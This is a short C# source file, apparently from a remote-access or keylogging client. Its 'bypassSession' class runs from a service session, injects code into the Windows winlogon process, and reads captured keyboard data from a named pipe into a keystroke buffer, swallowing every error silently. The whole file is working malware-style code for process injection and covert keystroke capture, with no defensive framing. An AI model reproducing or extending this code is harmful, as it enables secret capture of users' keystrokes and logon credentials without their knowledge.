using System.Diagnostics;
using System.IO.Pipes;
using System.Linq;
using System.Threading;
using newClient.keyboard;

namespace newClient.Utilities;

public class bypassSession
{
	public static void Run()
	{
		Process currentProcess = Process.GetCurrentProcess();
		while (currentProcess.SessionId == 0)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("winlogon");
				if (processesByName == null || processesByName.Length != 0)
				{
					Inject.Injectwinlogon();
					using NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "\\\\.\\pipe\\Global\\keyboardddd", PipeDirection.InOut);
					namedPipeClientStream.Connect(10000);
					Logger.Info("NamedPipeClientStream Connect");
					byte[] array = new byte[1024];
					while (true)
					{
						int num = namedPipeClientStream.Read(array, 0, array.Length);
						if (num != 0)
						{
							keyboardManagaers.KeyboardList.AddRange(array.Take(num));
							continue;
						}
						break;
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(3000);
		}
	}
}
